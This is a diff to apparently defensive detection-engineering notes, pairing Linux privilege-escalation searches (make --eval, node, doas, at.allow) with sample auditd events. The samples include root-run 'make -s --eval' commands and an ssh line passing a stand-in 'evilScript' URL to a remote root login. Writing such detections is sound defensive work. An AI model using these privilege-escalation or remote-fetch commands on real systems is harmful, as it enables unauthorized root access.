+type=SYSCALL msg=audit(03/20/2023 09:31:40.042:928) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211b390 a1=0x211ab60 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=2593 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
+type=PROCTITLE msg=audit(03/20/2023 09:31:40.042:928) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@10.10.10.10 http://example.com/evilScript 
+
+``` 
+
+
+
+### Linux Make Privilege Escalation
+
+Datamodel:   
+Auditd config:   
+CIM Mapping: 
+Search:  
+
+```
+| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
+  as lastTime from datamodel=Endpoint.Processes where Processes.process="*make*-s*" AND Processes.process="*--eval*" by Processes.dest Processes.user Processes.parent_process_name
+  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
+  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
+  | `security_content_ctime(lastTime)` | `linux_make_privilege_escalation_filter`
+```
+
+Limitations:   
+Sample events:    
+
+```
+type=SYSCALL msg=audit(03/20/2023 09:21:25.100:580) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5555da7ef248 a1=0x5555da801198 a2=0x5555da814ef0 a3=0x0 items=2 ppid=1529 pid=1531 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=make exe=/usr/bin/make subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=make_priv_escalation 
+type=EXECVE msg=audit(03/20/2023 09:21:25.100:580) : argc=3 a0=make a1=-s a2=--eval=y: 
+type=PATH msg=audit(03/20/2023 09:21:25.100:580) : item=0 name=/bin/make inode=100680824 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 09:21:25.100:580) : proctitle=make -s --eval=y: 
+type=USER_CMD msg=audit(03/20/2023 09:21:25.090:577) : pid=1529 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=make -s --eval=y: terminal=pts/0 res=success' 
+type=SYSCALL msg=audit(03/20/2023 09:21:16.241:573) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5574f6f0c248 a1=0x5574f6f1e198 a2=0x5574f6f31ef0 a3=0x0 items=2 ppid=1525 pid=1527 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=make exe=/usr/bin/make subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=make_priv_escalation 
+type=EXECVE msg=audit(03/20/2023 09:21:16.241:573) : argc=3 a0=make a1=-s a2=--eval=x: 
+type=PATH msg=audit(03/20/2023 09:21:16.241:573) : item=0 name=/bin/make inode=100680824 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
+type=PROCTITLE msg=audit(03/20/2023 09:21:16.241:573) : proctitle=make -s --eval=x: 
+
+``` 
 
 ### Linux Node Privilege Escalation
 
@@ -303,18 +647,6 @@ type=USER_CMD msg=audit(03/17/2023 17:33:39.977:2113) : pid=7765 uid=test-2 auid
 
 ```  
 
-
-### Linux Doas Conf File Creation
-Auditd config:- Yes (-w /etc/doas.conf -p wa -k doasconf).  
-CIM Mapping:- file_path, dest, file_create_time, file_name, process_guid.  
-Search:- No change  
-Limitations:-   
-Known false positives:- if you create a file withouth doas being installed.  
-Sample events:   
-```
-type=PATH msg=audit(01/05/2023 18:45:39.929:872) : item=1 name=/etc/doas.conf inode=33563215 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
-type=PROCTITLE msg=audit(01/05/2023 18:45:39.929:872) : proctitle=vi /etc/doas.conf 
-```
 
 ### Linux Doas Tool Execution
 
@@ -699,18 +1031,6 @@ type=CWD msg=audit(01/03/2023 17:56:29.074:709) :  cwd=/home/test-2
 type=PATH msg=audit(01/03/2023 17:56:29.074:709) : item=0 name=/lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/ inode=67670904 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:modules_object_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
 type=PATH msg=audit(01/03/2023 17:56:29.074:709) : item=1 name=/lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/test-kernel-driv-file3.txt inode=67180376 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:modules_object_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
 type=PROCTITLE msg=audit(01/03/2023 17:56:29.074:709) : proctitle=touch /lib/modules/3.10.0-1160.el7.x86_64/kernel/drivers/test-kernel-driv-file3.txt 
-```
-
-### Linux At Allow Config File Creation
-
-Auditd config: Yes.  ["-w /etc/at.allow -p wa -k atallow", "-w /etc/at.deny -p wa -k atdeny"]
-CIM Mapping: file_path, dest, file_create_time, file_name, process_guid.  
-Search: No change required.  
-Limitations:  
-Sample events:    
-
-```
-type=PATH msg=audit(02/03/2023 19:04:34.591:925) : item=3 name=/etc/at.deny inode=33563218 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:etc_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
 ```
 
 ### Linux Possible Append Command To At Allow Config File
